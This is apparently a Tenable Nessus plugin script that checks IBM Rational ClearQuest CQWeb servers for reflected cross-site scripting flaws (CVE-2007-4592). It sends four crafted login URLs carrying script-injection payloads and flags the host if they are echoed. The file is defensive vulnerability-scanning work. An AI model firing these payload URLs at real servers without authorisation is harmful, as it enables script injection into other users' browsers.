#
# (C) Tenable Network Security, Inc.
#

include("compat.inc");

if (description)
{
  script_id(39591);
  script_version("$Revision: 1.12 $");

  script_cve_id("CVE-2007-4592");
  script_bugtraq_id(28296);
  script_osvdb_id(43356);
  script_xref(name:"Secunia", value:"29467");

  script_name(english:"IBM Rational ClearQuest Multiple XSS Flaws");
  script_summary(english:"Checks for an XSS flaw on the login page");

  script_set_attribute(
    attribute:"synopsis",
    value:"The remote web server is affected by multiple flaws."
  );
  script_set_attribute(attribute:"description", value:
"IBM Rational ClearQuest CQWeb Server is installed on the remote host. 
The installed version is affected by multiple cross-site scripting
flaws.  Specifically, the application fails to sanitize input passed
to parameter 'contextid', 'schema', 'userNameVal' and 'username'
before using it to generate dynamic HTML content.  An unauthenticated,
remote attacker may be able to leverage this issue to inject arbitrary
HTML or script code into a user's browser to be executed within the
security context of the affected site." );
  script_set_attribute(
    attribute:"see_also", 
    value:"http://www.securityfocus.com/archive/1/archive/1/489861/100/0/threaded"
  );

  script_set_attribute(
    attribute:"solution", 
    value:"Apply patch 2003.06.16 Patch 2008A, 7.0.0.2_iFix01, or 7.0.1.1_iFix01."
  );
 script_set_cvss_base_vector("CVSS2#AV:N/AC:M/Au:N/C:N/I:P/A:N");
 script_set_cvss_temporal_vector("CVSS2#E:F/RL:OF/RC:C");
 script_set_attribute(attribute:"exploitability_ease", value:"Exploits are available");
 script_set_attribute(attribute:"exploit_available", value:"true");
 script_cwe_id(79);
 script_set_attribute(attribute:"plugin_publication_date", value: "2009/07/02");
 script_set_attribute(attribute:"patch_publication_date", value: "2008/08/04");
 script_cvs_date("$Date: 2015/09/24 21:08:40 $");
  script_set_attribute(attribute:"plugin_type", value:"remote");
  script_set_attribute(attribute:"cpe",value:"cpe:/a:ibm:rational_clearquest");
  script_set_attribute(attribute:"exploited_by_nessus", value:"true");
  script_end_attributes();

  script_category(ACT_ATTACK);
  script_family(english:"CGI abuses : XSS");

  script_copyright(english:"This script is Copyright (C) 2009-2015 Tenable Network Security, Inc.");

  script_dependencies("http_version.nasl", "cross_site_scripting.nasl");
  script_require_ports("Services/www", 80);

  exit(0);
}

include("global_settings.inc");
include("misc_func.inc");
include("http.inc");
include("url_func.inc");

port =  get_http_port(default:80, embedded: 0, no_xss: 1);

res = http_get_cache(item:"/", port:port, exit_on_fail: 1);

if("Rational Web Platform was installed and is running on this system" >!< res) 
  exit(0, "Rational ClearQuest is not running on this port." );

# Send a request to exploit the flaw.

xss  = string("<script>alert('",SCRIPT_NAME,"')</script>");
xss2 = string("alert('",SCRIPT_NAME,"');");

exploit[1] = string("/cqweb/login?targetUrl=/cqweb/main?command=GenerateMainFrame&username=test</script>",xss,"&password=nessus");
 result[1] = string('username=test</script>',xss);

exploit[2] = string('/cqweb/login?/cqweb/main?command=GenerateMainFrame&service=CQ&contextid=NESSUSDATABASE";',xss2,"//");
 result[2] = string('"NESSUSDATABASE";',xss2,"//");

exploit[3] = string('/cqweb/login?/cqweb/main?command=GenerateMainFrame&service=CQ&schema=NESSUSSCHEMA";',xss2,"//");
 result[3] = string('"NESSUSSCHEMA";',xss2,"//");

exploit[4] = string('/cqweb/login?targetUrl=/cqweb/main?command=GenerateMainFrame&username=test</script>',xss);
 result[4] = string("username=test</script>",xss);

for (i = 1 ; i < 5 ; i++)
{
  res = http_send_recv3(method:"GET", item:exploit[i], port:port, exit_on_fail: 1);

  # There's a problem if we see our exploit.

  if (result[i] >< res[2])
  {
    if (report_verbosity > 0)
    {
      report = string(
        "\n",
        "Nessus was able to verify the issue the following URL :\n",
        "\n",
        "  ", build_url(port:port, qs:exploit[i]), "\n"
      );
      security_warning(port:port, extra:report);
    }
    else security_warning(port);

    set_kb_item(name: 'www/'+port+'/XSS', value: TRUE);
    break;
  }
}
